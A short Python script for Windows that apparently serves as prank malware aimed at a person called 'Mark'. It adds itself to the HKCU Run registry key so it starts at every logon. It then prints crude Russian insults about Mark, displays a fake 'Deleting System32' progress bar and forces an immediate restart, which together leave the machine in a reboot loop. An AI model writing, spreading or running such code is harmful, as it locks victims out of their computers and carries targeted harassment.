import time
import os, sys, winreg
imja = 'МАРК'
class Mark:
    def __init__(self, position, real_name, place):
        self.position = position
        self.real_name = real_name
        self.place = place

    def get_mark_data(self):
        print(f'Позиция {imja}а в обществе: {self.position}\nНастоящее Имя {imja}а: {self.real_name}\nМесто проживания {imja}a: {self.place}')    
def set_startup():
    cmd = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "MyScript", 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)
if __name__ == "__main__":
    set_startup()
mark_valid = Mark('ХУЕСОС','СВИН', 'МАРИУПОЛЬ (ОКОП)')
mark_valid.get_mark_data()
for i in range(0,101, 10):
    print(f'\rУдаление Папки System32: {i}%...',end='')
    time.sleep(0.1)
os.system("shutdown -r -t 0")
           
    
